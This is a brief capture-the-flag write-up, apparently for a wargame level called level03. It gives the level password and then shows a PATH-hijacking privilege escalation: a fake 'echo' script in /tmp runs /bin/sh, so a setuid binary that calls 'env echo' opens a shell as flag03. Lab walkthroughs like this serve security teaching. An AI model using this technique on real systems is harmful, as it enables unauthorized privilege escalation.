level03:kooda2puivaav1idi4f57q8iq

`scp -P 4242 scp://level03@192.168.1.88/level03 level03`

`strings level03`
and we find `/usr/bin/env echo Exploit me`

so we can modify the path the execute a shell instead of env

```shell
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
export PATH="/tmp:$PATH"
```

Then once you run `./level03`, a flag03 shell pops